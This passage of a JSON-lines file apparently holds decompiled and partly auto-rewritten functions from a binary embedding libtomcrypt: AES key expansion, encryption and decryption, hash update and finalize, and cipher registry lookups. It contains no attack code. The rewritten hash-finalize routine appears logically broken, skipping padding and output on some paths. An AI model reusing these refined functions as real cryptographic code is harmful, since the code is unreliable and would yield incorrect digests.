= puVar3 + 4;\n}\n}\nelse if (param_2 == 0x18) {\nuVar1 = param_1[4];\nparam_4[4] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[5];\npuVar8 = &DAT_00439100;\nparam_4[5] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\npuVar3 = param_4;\nwhile( true ) {\nuVar1 = puVar3[5];\nuVar2 = *puVar8;\npuVar8 = puVar8 + 1;\nuVar2 = uVar2 ^ *puVar3 ^ *(uint *)(&DAT_0043b540 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043ad40 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar1 >> 8 & 0xff) * 4);\npuVar3[6] = uVar2;\nuVar2 = uVar2 ^ puVar3[1];\npuVar3[7] = uVar2;\nuVar2 = uVar2 ^ puVar3[2];\npuVar3[8] = uVar2;\nuVar2 = uVar2 ^ puVar3[3];\npuVar3[9] = uVar2;\nif (puVar3 == param_4 + 0x2a) break;\nuVar2 = uVar2 ^ puVar3[4];\npuVar3[10] = uVar2;\npuVar3[0xb] = uVar2 ^ uVar1;\npuVar3 = puVar3 + 6;\n}\n}\nelse {\nif (param_2 != 0x20) {\nreturn 1;\n}\nuVar1 = param_1[4];\nparam_4[4] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[5];\nparam_4[5] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[6];\nparam_4[6] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\nuVar1 = param_1[7];\npuVar8 = &DAT_00439100;\nparam_4[7] = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\npuVar3 = param_4;\nwhile( true ) {\nuVar1 = puVar3[7];\nuVar2 = *puVar8;\npuVar8 = puVar8 + 1;\nuVar2 = uVar2 ^ *puVar3 ^ *(uint *)(&DAT_0043b540 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043ad40 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar1 >> 8 & 0xff) * 4);\npuVar3[8] = uVar2;\nuVar2 = uVar2 ^ puVar3[1];\npuVar3[9] = uVar2;\nuVar2 = uVar2 ^ puVar3[2];\npuVar3[10] = uVar2;\nuVar2 = uVar2 ^ puVar3[3];\npuVar3[0xb] = uVar2;\nif (puVar3 == param_4 + 0x30) break;\nuVar2 = *(uint *)(&DAT_0043b540 + (ulong)(uVar2 >> 8 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar2 & 0xff) * 4) ^ puVar3[4] ^\n*(uint *)(&DAT_0043ad40 + (ulong)(uVar2 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043b140 + (ulong)((uVar2 >> 8 & 0xff00) >> 8) * 4);\npuVar3[0xc] = uVar2;\nuVar2 = uVar2 ^ puVar3[5];\npuVar3[0xd] = uVar2;\nuVar2 = uVar2 ^ puVar3[6];\npuVar3[0xe] = uVar2;\npuVar3[0xf] = uVar2 ^ uVar1;\npuVar3 = puVar3 + 8;\n}\n}\npuVar3 = param_4 + 0x3c;\nlVar5 = (long)(int)(param_2 + 0x1c) + -4;\npuVar8 = param_4 + lVar5;\nparam_4[0x3c] = param_4[lVar5];\nparam_4[0x3d] = puVar8[1];\nparam_4[0x3e] = puVar8[2];\nparam_4[0x3f] = puVar8[3];\nif (1 < (int)param_4[0x78]) {\niVar7 = 1;\npuVar4 = puVar8;\npuVar6 = puVar3;\ndo {\npuVar8 = puVar4 + -4;\nuVar1 = *puVar8;\npuVar3 = puVar6 + 4;\niVar7 = iVar7 + 1;\n*puVar3 = *(uint *)(&DAT_00439140 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_00439d40 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_00439940 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_00439540 + (ulong)(uVar1 >> 8 & 0xff) * 4);\nuVar1 = puVar4[-3];\npuVar6[5] = *(uint *)(&DAT_00439140 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_00439d40 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_00439940 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_00439540 + (ulong)(uVar1 >> 8 & 0xff) * 4);\nuVar1 = puVar4[-2];\npuVar6[6] = *(uint *)(&DAT_00439140 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_00439d40 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_00439940 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_00439540 + (ulong)(uVar1 >> 8 & 0xff) * 4);\nuVar1 = puVar4[-1];\npuVar6[7] = *(uint *)(&DAT_00439140 + (ulong)(uVar1 & 0xff) * 4) ^\n*(uint *)(&DAT_00439d40 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_00439940 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_00439540 + (ulong)(uVar1 >> 8 & 0xff) * 4);\npuVar4 = puVar8;\npuVar6 = puVar3;\n} while (iVar7 < (int)param_4[0x78]);\n}\npuVar3[4] = puVar8[-4];\npuVar3[5] = puVar8[-3];\npuVar3[6] = puVar8[-2];\npuVar3[7] = puVar8[-1];\nreturn 0;\n}"}
{"Function Name": "FUN_00413520", "Address": "00413520", "Source Code": "undefined  [16] FUN_00413520(uint *param_1,uint *param_2,uint *param_3)\n{\nbyte bVar2;\nuint uVar1;\nuint uVar3;\nbyte bVar4;\nbyte bVar6;\nuint uVar5;\nuint *puVar7;\nuint uVar8;\nuint uVar9;\nuint uVar10;\nint iVar11;\nuint uVar12;\nif (param_1 == (uint *)0x0) {\nFUN_00410bc0(\"pt != NULL\",\"libtomcrypt.c\",0x7ded);\n}\nif (param_2 == (uint *)0x0) {\nFUN_00410bc0(\"ct != NULL\",\"libtomcrypt.c\",0x7dee);\n}\nif (param_3 == (uint *)0x0) {\nFUN_00410bc0(\"skey != NULL\",\"libtomcrypt.c\",0x7def);\n}\nuVar3 = *param_1;\nuVar10 = (uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18) ^\n*param_3;\nuVar3 = param_1[1];\nuVar9 = (uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18) ^\nparam_3[1];\nuVar3 = param_1[2];\nuVar8 = (uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18) ^\nparam_3[2];\nuVar3 = param_1[3];\nuVar3 = (uVar3 >> 0x18 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar3 << 0x18) ^\nparam_3[3];\npuVar7 = param_3;\niVar11 = (int)param_3[0x78] >> 1;\nwhile( true ) {\nuVar1 = *(uint *)(&DAT_0043d140 + (ulong)(uVar10 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar3 & 0xff) * 4) ^ puVar7[4] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar9 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)(uVar8 >> 8 & 0xff) * 4);\nuVar12 = *(uint *)(&DAT_0043d140 + (ulong)(uVar9 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar10 & 0xff) * 4) ^ puVar7[5] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar8 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)(uVar3 >> 8 & 0xff) * 4);\nuVar5 = *(uint *)(&DAT_0043d140 + (ulong)(uVar8 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar9 & 0xff) * 4) ^ puVar7[6] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar3 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)(uVar10 >> 8 & 0xff) * 4);\nuVar3 = *(uint *)(&DAT_0043d140 + (ulong)(uVar3 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar8 & 0xff) * 4) ^ puVar7[7] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar10 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)(uVar9 >> 8 & 0xff) * 4);\niVar11 = iVar11 + -1;\nbVar2 = (byte)(uVar1 >> 8);\nbVar4 = (byte)(uVar3 >> 8);\nbVar6 = (byte)(uVar5 >> 8);\nif (iVar11 == 0) break;\nuVar10 = *(uint *)(&DAT_0043d140 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + ((ulong)uVar3 & 0xff) * 4) ^ puVar7[8] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar12 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)bVar6 * 4);\nuVar9 = *(uint *)(&DAT_0043d140 + (ulong)(uVar12 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + ((ulong)uVar1 & 0xff) * 4) ^ puVar7[9] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar5 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)bVar4 * 4);\nuVar8 = *(uint *)(&DAT_0043d140 + (ulong)(uVar5 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar12 & 0xff) * 4) ^ puVar7[10] ^\n*(uint *)(&DAT_0043c540 + ((ulong)(uVar3 >> 0x10) & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)bVar2 * 4);\nuVar3 = *(uint *)(&DAT_0043d140 + (ulong)(uVar3 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043bd40 + (ulong)(uVar5 & 0xff) * 4) ^ puVar7[0xb] ^\n*(uint *)(&DAT_0043c540 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043c140 + (ulong)(byte)(uVar12 >> 8) * 4);\npuVar7 = puVar7 + 8;\n}\nparam_3 = param_3 + ((ulong)(((int)param_3[0x78] >> 1) - 1) + 1) * 8;\nuVar8 = *(uint *)(&DAT_0043ad40 + (ulong)(uVar1 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar3 & 0xff) * 4) ^ *param_3 ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar12 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b540 + (ulong)bVar6 * 4);\n*param_2 = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;\nuVar8 = *(uint *)(&DAT_0043ad40 + (ulong)(uVar12 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar1 & 0xff) * 4) ^ param_3[1] ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar5 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b540 + (ulong)bVar4 * 4);\nparam_2[1] = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;\nuVar8 = *(uint *)(&DAT_0043ad40 + (ulong)(uVar5 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar12 & 0xff) * 4) ^ param_3[2] ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar3 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b540 + (ulong)bVar2 * 4);\nparam_2[2] = uVar8 >> 0x18 | (uVar8 & 0xff0000) >> 8 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;\nuVar8 = *(uint *)(&DAT_0043ad40 + (ulong)(uVar3 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043b940 + (ulong)(uVar5 & 0xff) * 4) ^ param_3[3] ^\n*(uint *)(&DAT_0043b140 + (ulong)(uVar1 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043b540 + (ulong)(uVar12 >> 8 & 0xff) * 4);\nuVar3 = (uVar8 & 0xff0000) >> 8;\nparam_2[3] = uVar8 >> 0x18 | uVar3 | (uVar8 & 0xff00) << 8 | uVar8 << 0x18;\nreturn ZEXT416(uVar8 & 0xffff | uVar3 << 8 | (uVar8 >> 0x18) << 0x18) << 0x40;\n}"}
{"Function Name": "FUN_004138d0", "Address": "004138d0", "Source Code": "undefined8 FUN_004138d0(uint *param_1,uint *param_2,long param_3)\n{\nbyte bVar1;\nbyte bVar3;\nuint uVar2;\nuint uVar4;\nbyte bVar5;\nbyte bVar7;\nuint uVar6;\nint iVar8;\nuint *puVar9;\nuint uVar10;\nuint uVar11;\nuint uVar12;\nint iVar13;\nuint uVar14;\nif (param_2 == (uint *)0x0) {\nFUN_00410bc0(\"pt != NULL\",\"libtomcrypt.c\",0x7ea0);\n}\nif (param_1 == (uint *)0x0) {\nFUN_00410bc0(\"ct != NULL\",\"libtomcrypt.c\",0x7ea1);\n}\nif (param_3 == 0) {\nFUN_00410bc0(\"skey != NULL\",\"libtomcrypt.c\",0x7ea2);\n}\nuVar6 = *param_1;\nuVar12 = (uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18) ^\n*(uint *)(param_3 + 0xf0);\nuVar6 = param_1[1];\nuVar11 = (uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18) ^\n*(uint *)(param_3 + 0xf4);\nuVar6 = param_1[2];\nuVar10 = (uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18) ^\n*(uint *)(param_3 + 0xf8);\nuVar6 = param_1[3];\nuVar6 = (uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 | uVar6 << 0x18) ^\n*(uint *)(param_3 + 0xfc);\niVar8 = *(int *)(param_3 + 0x1e0) >> 1;\npuVar9 = (uint *)(param_3 + 0xf0);\niVar13 = iVar8;\nwhile( true ) {\nuVar2 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar12 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + (ulong)(uVar11 & 0xff) * 4) ^ puVar9[4] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar6 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)(uVar10 >> 8 & 0xff) * 4);\nuVar14 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar11 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + (ulong)(uVar10 & 0xff) * 4) ^ puVar9[5] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar12 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)(uVar6 >> 8 & 0xff) * 4);\nuVar4 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar10 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + (ulong)(uVar6 & 0xff) * 4) ^ puVar9[6] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar11 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)(uVar12 >> 8 & 0xff) * 4);\nuVar6 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar6 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + (ulong)(uVar12 & 0xff) * 4) ^ puVar9[7] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar10 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)(uVar11 >> 8 & 0xff) * 4);\niVar13 = iVar13 + -1;\nbVar3 = (byte)(uVar2 >> 8);\nbVar5 = (byte)(uVar4 >> 8);\nbVar7 = (byte)(uVar6 >> 8);\nbVar1 = (byte)(uVar14 >> 8);\nif (iVar13 == 0) break;\nuVar12 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar2 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + ((ulong)uVar14 & 0xff) * 4) ^ puVar9[8] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar6 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)bVar5 * 4);\nuVar11 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar14 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + ((ulong)uVar4 & 0xff) * 4) ^ puVar9[9] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar2 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)bVar7 * 4);\nuVar10 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar4 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + ((ulong)uVar6 & 0xff) * 4) ^ puVar9[10] ^\n*(uint *)(&DAT_0043a940 + ((ulong)(uVar14 >> 0x10) & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)bVar3 * 4);\nuVar6 = *(uint *)(&DAT_0043cd40 + (ulong)(uVar6 >> 0x18) * 4) ^\n*(uint *)(&DAT_0043a140 + ((ulong)uVar2 & 0xff) * 4) ^ puVar9[0xb] ^\n*(uint *)(&DAT_0043a940 + (ulong)(uVar4 >> 0x10 & 0xff) * 4) ^\n*(uint *)(&DAT_0043a540 + (ulong)bVar1 * 4);\npuVar9 = puVar9 + 8;\n}\npuVar9 = (uint *)(param_3 + 0xf0) + ((ulong)(iVar8 - 1) + 1) * 8;\nuVar10 = *(uint *)(&DAT_0043c940 + (ulong)(uVar2 >> 0x18) * 4) & 0xff000000 ^\n(uint)(byte)(&DAT_0043c940)[(ulong)(uVar14 & 0xff) * 4] ^ *puVar9;\nuVar11 = uVar10 ^ *(uint *)(&DAT_0043c940 + (ulong)(uVar6 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n*(uint *)(&DAT_0043c940 + (ulong)bVar5 * 4) & 0xff00;\n*param_2 = uVar10 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar10 << 0x18;\nuVar10 = *(uint *)(&DAT_0043c940 + (ulong)(uVar14 >> 0x18) * 4) & 0xff000000 ^\n(uint)(byte)(&DAT_0043c940)[(ulong)(uVar4 & 0xff) * 4] ^ puVar9[1];\nuVar11 = uVar10 ^ *(uint *)(&DAT_0043c940 + (ulong)(uVar2 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n*(uint *)(&DAT_0043c940 + (ulong)bVar7 * 4) & 0xff00;\nparam_2[1] = uVar10 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar10 << 0x18;\nuVar10 = *(uint *)(&DAT_0043c940 + (ulong)(uVar4 >> 0x18) * 4) & 0xff000000 ^\n(uint)(byte)(&DAT_0043c940)[(ulong)(uVar6 & 0xff) * 4] ^ puVar9[2];\nuVar11 = uVar10 ^ *(uint *)(&DAT_0043c940 + (ulong)(uVar14 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n*(uint *)(&DAT_0043c940 + (ulong)bVar3 * 4) & 0xff00;\nparam_2[2] = uVar10 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar10 << 0x18;\nuVar6 = *(uint *)(&DAT_0043c940 + (ulong)(uVar6 >> 0x18) * 4) & 0xff000000 ^\n(uint)(byte)(&DAT_0043c940)[(ulong)(uVar2 & 0xff) * 4] ^ puVar9[3];\nuVar10 = uVar6 ^ *(uint *)(&DAT_0043c940 + (ulong)(uVar4 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n*(uint *)(&DAT_0043c940 + (ulong)bVar1 * 4) & 0xff00;\nparam_2[3] = uVar6 >> 0x18 | (uVar10 & 0xff0000) >> 8 | (uVar10 & 0xff00) << 8 | uVar6 << 0x18;\nreturn 0;\n}"}
{"Function Name": "FUN_00413dc0", "Address": "00413dc0", "Source Code": "undefined8 FUN_00413dc0(long *inputArray, void *inputPointer, ulong dataSize)\n{\n    uint valueFromFourthElement; \n    undefined8 returnValue; \n    ulong calculatedSize; \n    void *updatedParam2Pointer; \n    \n    if (inputArray == (long *)0x0) {\n        FUN_00410bc0(\"md != NULL\", \"libtomcrypt.c\", 0x85d0);\n    }\n    \n    if (inputPointer == (void *)0x0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x85d0);\n    }\n    \n    valueFromFourthElement = *(uint *)(inputArray + 3);\n    \n    if (valueFromFourthElement < 0x41) {\n        \n        if (dataSize != 0) {\n            while (true) {\n                \n                if ((valueFromFourthElement == 0) && (0x3f < dataSize)) {\n                    \n                    returnValue = FUN_00404320(inputArray, inputPointer);\n                    if ((int)returnValue != 0) {\n                        return returnValue; \n                    }\n                    \n                    dataSize -= 0x40;\n                    *inputArray += 0x200; \n                    inputPointer = (void *)((long)inputPointer + 0x40); \n                } else {\n                    \n                    calculatedSize = (dataSize < 0x40 - valueFromFourthElement) ? dataSize : (0x40 - valueFromFourthElement);\n                    updatedParam2Pointer = (void *)((long)inputPointer + calculatedSize); \n                    dataSize -= calculatedSize; \n                    \n                    memcpy((void *)((long)inputArray + (ulong)valueFromFourthElement + 0x1c), inputPointer, calculatedSize);\n                    *(int *)(inputArray + 3) += (int)calculatedSize; \n                    inputPointer = updatedParam2Pointer; \n                    \n                    if (*(int *)(inputArray + 3) == 0x40) {\n                        \n                        returnValue = FUN_00404320(inputArray, (long)inputArray + 0x1c);\n                        if ((int)returnValue != 0) {\n                            return returnValue; \n                        }\n                        *inputArray += 0x200; \n                        *(undefined4 *)(inputArray + 3) = 0; \n                    }\n                }\n                \n                if (dataSize == 0) break;\n                valueFromFourthElement = *(uint *)(inputArray + 3); \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00413ef0", "Address": "00413ef0", "Source Code": "undefined8 FUN_00413ef0(long *data_array,long output_buffer)\n{\n    uint index; \n    long calculated_value; \n    \n    if (data_array == (long *)0x0) {\n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x85dc);\n    }\n    \n    if (output_buffer == 0) {\n        FUN_00410bc0(\"out != NULL\",\"libtomcrypt.c\",0x85dd);\n    }\n    \n    \n    index = *(uint *)(data_array + 3);\n    \n    \n    if (0x3f < index) {\n        return 0x10;\n    }\n    \n    \n    calculated_value = (ulong)(index * 8) + *data_array;\n    \n    \n    *(uint *)(data_array + 3) = index + 1;\n    \n    \n    *data_array = calculated_value;\n    \n    \n    *(undefined *)((long)data_array + (ulong)index + 0x1c) = 0x80;\n    \n    if (index + 1 < 0x39) {\n        \n        if (index + 1 == 0x38) goto LAB_00413f62;\n    } else {\n        \n        if (index + 1 != 0x40) {\n            for (uint temp_index = index + 1; temp_index < 0x40; temp_index++) {\n                *(undefined *)((long)data_array + temp_index + 0x1c) = 0;\n            }\n            \n            *(uint *)(data_array + 3) = 0x40;\n        }\n    }\n    \n    \n    FUN_00404320(data_array,(long)data_array + 0x1c);\n    \n    \n    *(uint *)(data_array + 3) = 0;\n    \n    for (long copy_index = 0; copy_index < 0x38; copy_index += 4) {\n        *(undefined4 *)(output_buffer + copy_index) = *(undefined4 *)((long)data_array + copy_index + 8);\n    }\n    \n    return 0; \nLAB_00413f62:\n    \n    *(long *)((long)data_array + 0x54) = calculated_value;\n    \n    \n    FUN_00404320(data_array,(long)data_array + 0x1c);\n    \n    return 0; \n}"}
{"Function Name": "FUN_004140c0", "Address": "004140c0", "Source Code": "int FUN_004140c0(char *input_string) \n{\n    char **string_list_pointer = (char **)&DAT_0065b5c0; \n    int index_counter = 0; \n    if (input_string == (char *)0x0) { \n        FUN_00410bc0(\"name != NULL\",\"libtomcrypt.c\",0x431a); \n    }\n    do {\n        if (*string_list_pointer != (char *)0x0 && strcmp(*string_list_pointer, input_string) == 0) { \n            return index_counter; \n        }\n        index_counter++; \n        string_list_pointer += 0x16; \n    } while (index_counter != 0x100); \n    return -1; \n}"}
{"Function Name": "FUN_00414130", "Address": "00414130", "Source Code": "ulong FUN_00414130(long inputPointer, int threshold1, int threshold2)\n{\n    ulong returnValue; \n    int *dataPointer; \n    \n    if (inputPointer == 0) {\n        \n        FUN_00410bc0(\"name != NULL\", \"libtomcrypt.c\", 0x4346);\n    }\n    \n    \n    returnValue = FUN_004140c0(inputPointer);\n    \n    \n    if ((int)returnValue == -1) {\n        dataPointer = &DAT_0065b5d4; \n        returnValue = 0; \n        \n        \n        while (((*(long *)(dataPointer + -5) == 0 || (*dataPointer < threshold1)) || (dataPointer[-1] < threshold2))) {\n            returnValue++; \n            dataPointer += 0x2c; \n            \n            \n            if (returnValue == 0x100) {\n                return 0xffffffff; \n            }\n        }\n    }\n    \n    return returnValue; \n}"}
{"Function Name": "FUN_00414210", "Address": "00414210", "Source Code": "int FUN_00414210(char *input_string) \n{\n    char **char_pointer_array = (char **)&DAT_0064e5c0; \n    int index = 0; \n    if (input_string == (char *)0x0) { \n        FUN_00410bc0(\"name != NULL\",\"libtomcrypt.c\",0x43a1); \n    }\n    do { \n        if (*char_pointer_array != (char *)0x0 && strcmp(*char_pointer_array, input_string) == 0) { \n            return index; \n        }\n        index++; \n        char_pointer_array += 0x1a; \n    } while (index != 0x100); \n    return -1; \n}"}
{"Function Name": "FUN_00414280", "Address": "00414280", "Source Code": "ulong FUN_00414280(long input_param, int comparison_value)\n{\n    ulong return_value; \n    uint loop_counter = 0; \n    long *data_pointer = &DAT_0064e5c0; \n    int upper_limit = 0x81; \n    \n    if (input_param == 0) {\n        FUN_00410bc0(\"name != NULL\", \"libtomcrypt.c\", 0x43cb); \n    }\n    \n    \n    return_value = FUN_00414210(input_param);\n    \n    \n    if ((int)return_value != -1) {\n        return return_value;\n    }\n    \n    do {\n        \n        if (*data_pointer != 0) {\n            int current_value = (int)data_pointer[2]; \n            \n            \n            if ((comparison_value <= current_value) && (current_value < upper_limit)) {\n                return_value = (ulong)loop_counter; \n                upper_limit = current_value; \n            }\n        }\n        loop_counter++; \n        data_pointer += 0x1a; \n    } while (loop_counter != 0x100); \n    \n    return return_value; \n}"}
{"Function Name": "FUN_00414370", "Address": "00414370", "Source Code": "int FUN_00414370(void *input_ptr,long length)\n{\n    undefined *data_ptr = &DAT_0064e5e0; \n    int index = 0; \n    if (input_ptr == (void *)0x0) { \n        FUN_00410bc0(\"ID != NULL\",\"libtomcrypt.c\",0x4423); \n    }\n    do {\n        \n        if ((*(long *)(data_ptr + -0x20) != 0) && (*(long *)(data_ptr + 0x80) == length)) {\n            \n            if (memcmp(data_ptr, input_ptr, length * 8) == 0) {\n                return index; \n            }\n        }\n        index++; \n        data_ptr += 0xd0; \n    } while (index != 0x100); \n    \n    return -1; \n}"}
{"Function Name": "FUN_00414410", "Address": "00414410", "Source Code": "int FUN_00414410(char *input_name) \n{\n    char **char_pointer_array = (char **)&DAT_006495c0; \n    if (input_name == (char *)0x0) { \n        FUN_00410bc0(\"name != NULL\",\"libtomcrypt.c\",0x444d); \n    }\n    for (int index = 0; index < 0x100; index++, char_pointer_array += 10) { \n        if (*char_pointer_array != (char *)0x0 && strcmp(*char_pointer_array, input_name) == 0) { \n            return index; \n        }\n    }\n    return -1; \n}"}
{"Function Name": "FUN_004144e0", "Address": "004144e0", "Source Code": "int FUN_004144e0(undefined8 *cipher_data) \n{\n    int index = 0; \n    long *data_pointer = &DAT_0065b5c0; \n    if (cipher_data == (undefined8 *)0x0) { \n        FUN_00410bc0(\"cipher != NULL\", \"libtomcrypt.c\", 0x4544); \n    }\n    \n    while (*data_pointer == 0 || (*(char *)(data_pointer + 1) != *(char *)(cipher_data + 1))) {\n        index++; \n        data_pointer += 0x16; \n        if (index == 0x100) { \n            data_pointer = &DAT_0065b5c0; \n            index = 0; \n            do {\n                if (*data_pointer == 0) { \n                    undefined8 *new_entry_pointer = &DAT_0065b5c0 + (long)index * 0x16; \n                    for (long copy_count = 0x16; copy_count != 0; copy_count--) { \n                        *new_entry_pointer = *cipher_data; \n                        cipher_data++; \n                        new_entry_pointer++; \n                    }\n                    return index; \n                }\n                index++; \n                data_pointer += 0x16; \n            } while (index != 0x100); \n            return -1; \n        }\n    }\n    return index; \n}"}
